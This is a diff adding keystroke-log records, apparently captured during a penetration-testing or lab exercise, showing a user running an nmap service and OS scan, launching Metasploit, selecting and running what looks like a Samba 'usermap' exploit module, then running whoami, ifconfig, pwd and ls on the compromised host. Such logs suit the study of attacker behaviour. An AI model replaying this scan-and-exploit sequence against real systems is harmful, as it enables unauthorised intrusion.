@@ -1,0 +1,9 @@
+{"_id":{"$oid":"57cc9559c3162f792749c76f"},"content":"nmap -s[Shift_R]V -[Shift_L]O [P_End][P_Home][P_Down][P_Delete][P_End][P_Right][P_Delete][P_End][P_Next][P_Insert][P_Delete][P_Right][P_Up][P_Enter]","className":"Keypresses","start":"Thu Jun 09 17:36:01 MDT 2016"}
+{"_id":{"$oid":"57cc9559c3162f792749c770"},"content":"msfconsole[Return]","className":"Keypresses","start":"Thu Jun 09 17:37:16 MDT 2016"}
+{"_id":{"$oid":"57cc9559c3162f792749c771"},"content":"use exploi[Tab]mul[Tab]sam[Tab]user[Tab][Return]show oo[BackSpace]ptions[Return]set rhos[Tab]","className":"Keypresses","start":"Thu Jun 09 17:37:53 MDT 2016"}
+{"_id":{"$oid":"57cc9559c3162f792749c772"},"content":"[P_End][P_Home][P_Down][P_Delete][P_End][P_Right][P_Delete][P_End][P_Next][P_Insert][P_Delete][P_Right][P_Up][Return]run","className":"Keypresses","start":"Thu Jun 09 17:38:05 MDT 2016"}
+{"_id":{"$oid":"57cc9559c3162f792749c773"},"content":"[Return]","className":"Keypresses","start":"Thu Jun 09 17:38:10 MDT 2016"}
+{"_id":{"$oid":"57cc9559c3162f792749c774"},"content":"whoami[Return]","className":"Keypresses","start":"Thu Jun 09 17:38:32 MDT 2016"}
+{"_id":{"$oid":"57cc9559c3162f792749c775"},"content":"ifconfig[Return]","className":"Keypresses","start":"Thu Jun 09 17:38:36 MDT 2016"}
+{"_id":{"$oid":"57cc9559c3162f792749c776"},"content":"pwd[Return]ls[Return]","className":"Keypresses","start":"Thu Jun 09 17:38:45 MDT 2016"}
+{"_id":{"$oid":"57cc9559c3162f792749c777"},"content":"[Control_L]cy","className":"Keypresses","start":"Thu Jun 09 17:38:52 MDT 2016"}
